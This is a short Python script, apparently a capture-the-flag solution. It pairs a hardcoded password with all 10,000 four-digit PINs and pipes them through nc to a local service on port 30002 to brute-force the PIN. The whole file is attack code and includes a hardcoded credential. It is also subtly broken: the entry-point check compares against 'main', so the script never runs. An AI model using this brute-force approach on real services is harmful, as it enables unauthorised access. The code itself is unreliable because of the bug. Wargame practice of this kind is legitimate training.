import itertools
import os


def main():
    resultado = itertools.product("0123456789", repeat=4)
    senha = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

    for i in resultado:
        j = ''.join(i)
        os.system('touch lista; echo {} {} >> lista '.format(senha, j))
    os.system('cat lista | nc localhost 30002 | grep "The pass"')


if __name__ == 'main':
    main()
